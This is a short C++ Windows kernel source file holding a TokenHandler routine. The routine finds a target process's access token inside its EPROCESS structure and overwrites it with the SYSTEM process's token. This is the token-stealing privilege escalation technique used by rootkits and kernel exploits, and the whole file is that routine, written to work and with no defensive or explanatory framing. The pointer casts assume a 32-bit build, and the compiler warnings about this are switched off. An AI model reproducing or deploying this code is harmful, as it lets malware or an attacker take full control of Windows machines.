#pragma warning( disable : 4311 4302 )
#include "TokenHandler.h"
//#include <ntddk.h>

void TokenHandler::ReplaceToken(PEPROCESS Process, PACCESS_TOKEN Token) {
	PACCESS_TOKEN SystemToken;
	PULONG ptr;

	SystemToken = PsReferencePrimaryToken(PsInitialSystemProcess);
	ptr = (PULONG)Process;

	ULONG i;
	for (i = 0; i < 512; i++)
	{
		if ((ptr[i] & ~7) == (ULONG)((ULONG)Token & ~7))
		{
			DbgPrint("Replaceing token");
			ptr[i] = (ULONG)SystemToken; // Replace the orginal token with system token.
			break;
		}
	}

	ObfDereferenceObject(SystemToken);
}